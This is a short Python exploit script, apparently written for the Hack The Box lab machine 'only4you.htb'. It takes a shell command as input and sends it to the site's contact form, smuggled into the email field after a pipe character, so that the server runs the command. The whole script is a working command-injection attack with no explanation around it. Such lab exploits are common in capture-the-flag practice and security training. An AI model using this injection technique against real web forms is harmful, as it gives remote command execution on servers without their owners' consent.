#!/usr/bin/python3
# Author: Hack.You
import requests

command = input('Enter Command: ')

url = 'http://only4you.htb/'
data = {
    'email': f'pwned@pwner.com|{command}',
    'subject': 'Pwned',
    'message': 'Pwned By Hack.You'
}
requests.post(url,data=data)
print('Done xD')
